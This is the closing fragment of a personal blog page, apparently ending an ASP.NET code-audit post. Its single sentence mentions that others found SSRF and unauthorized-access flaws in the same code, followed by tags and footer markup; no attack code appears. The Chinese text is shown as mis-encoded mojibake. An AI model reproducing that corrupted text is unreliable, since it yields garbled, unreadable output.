<p>æ®è¯´è¿™å¥—æºç å…¶ä»–å¸ˆå‚…è¿˜å®¡å‡ºäº†SSRFã€æœªæˆæƒè®¿é—®ç­‰ï¼Œå…¶ä»–çš„ç­‰æœ‰ç©ºå†å»å®¡å®¡å­¦ä¹ ä¸€ä¸‹å§ã€‚</p>
<p>&emsp;</p>
<p><em>Hehanzzz 2023å¹´12æœˆ25æ—¥ å¤œ</em></p>

        </div>
    
<!-- tags -->

    <div class="post-meta">
        æ ‡ç­¾ï¼š
        
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"> / ä»£ç å®¡è®¡</a>
        
            <a href="/tags/ASP-NET/"> / ASP.NET</a>
        
    </div>

</div>
                <div class="footer">
    <span>Copyright Â© <script>document.write(new Date().getFullYear())</script> Hello Hehanzzz~</span>
    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
</div>

<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>

<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    </body>
</html>